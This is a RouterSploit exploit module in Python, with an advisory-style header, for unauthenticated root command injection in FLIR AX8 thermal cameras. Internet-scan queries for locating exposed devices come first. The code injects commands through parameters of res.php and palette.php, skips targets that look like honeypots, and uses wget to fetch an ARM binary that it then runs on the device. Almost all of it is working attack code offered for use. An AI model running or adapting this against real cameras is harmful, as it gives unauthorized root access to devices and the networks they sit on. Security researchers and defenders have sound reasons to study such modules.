'''
Exploit Title: FLIR AX8 Thermal Camera 1.32.16 - Remote Code Execution
Date: 2018-10-14
Vendor: FLIR Systems, Inc.
Product web page: https://www.flir.com
Affected version: Firmware: 1.32.16, 1.17.13, OS: neco_v1.8-0-g7ffe5b3, Hardware: Flir Systems Neco Board
Tested on: GNU/Linux 3.0.35-flir+gfd883a0 (armv7l), lighttpd/1.4.33, PHP/5.4.14
References:
Advisory ID: ZSL-2018-5491
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5491.php

Desc: The FLIR AX8 thermal sensor camera suffers from two unauthenticated
command injection vulnerabilities. The issues can be triggered when calling
multiple unsanitized HTTP GET/POST parameters within the shell_exec function
in res.php and palette.php file. This can be exploited to inject arbitrary
system commands and gain root remote code execution.

shodan search: Set-Cookie: showCameraId=false
censys search: services.http.response.headers:"Set-Cookie: showCameraId=false"
fofa search: header="Set-Cookie: showCameraId=false"
zoomeye search: headers:"Set-Cookie: showCameraId=false"
'''


from routersploit.core.exploit import shell
from routersploit.core.exploit.option import OptIP, OptPort
from routersploit.core.exploit.printer import log
from routersploit.core.exploit.utils import is_it_honeypot
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {'name': 'FLIR AX8 Thermal Camera - Remote Code Execution'}

    headers = {
        'Cache-Control': 'max-age=0',
        'User-Agent': 'thricer/251.4ev4h',
        'Accept': 'text/html,application/xhtml+xml',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'mk-MK,mk;q=1.7',
        'Connection': 'close',
        'Connection-Type': 'application/x-www-form-urlencoded'
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")

    def execute(self, cmd: str) -> str:
        data = {
            'action': 'get',
            'resource': ';' + cmd
        }
        response = self.http_request(method="POST", path="/res.php", headers=self.headers, data=data)
        if response and response.status_code == 200:
            return response.text
        print_status("Check to another RCE method for %s:%d", self.target, self.port)
        return self.execute2(cmd)

    def execute2(self, cmd: str) -> str:
        data = {'palette': f'1;{cmd}'}
        response = self.http_request(method="POST", path="/palette.php", headers=self.headers, data=data)
        if response and response.status_code == 200:
            return response.text
        print_error('Response invalid')
        return ''

    def check(self) -> bool:
        response = self.http_request(method="GET", path='/public/css/FLIR/style-common.php', allow_redirects=True)
        if response and "/public/img/light_precision/flir_logo.png" in response.text and not is_it_honeypot(response):
            return True
        return False

    def run(self):
        if self.check():
            print_success("Target seams %s:%d is vulnerable", self.target, self.port)
            shell(
                self,
                architecture="armle",
                method="wget",
                location="/var/",
                exec_binary=['chmod 777 {}', '{}']
            )
            # print_status('Target: %s:%d => output: "%s"', self.target, self.port, self.execute(self.command))
        else:
            print_error("Exploit failed - target %s:%d seems to be not vulnerable", self.target, self.port)
